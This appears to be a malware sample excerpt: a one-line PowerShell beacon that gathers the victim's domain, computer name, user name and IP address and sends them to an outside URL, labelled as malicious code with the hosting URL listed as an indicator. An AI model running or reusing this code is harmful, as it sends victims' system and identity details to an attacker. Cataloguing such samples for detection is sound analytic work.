$domain=$env:UserDomain;$pcname=$env:ComputerName;$user=$env:UserName;$ip=(Test-Connection ::1 -Cou 1 | select IPv4Address | findstr [0-9]).Split()[-1];$link="http://www.preios.it/cud2017log.php?pc="+$pcname+"&user="+$user+"&domain="+$domain+"&ip="+$ip;Invoke-WebRequest -Uri $link
############################## Malicious code  ##############################
Malware hosting URLs: http://www.preios.it/cud2017log.php?pc=
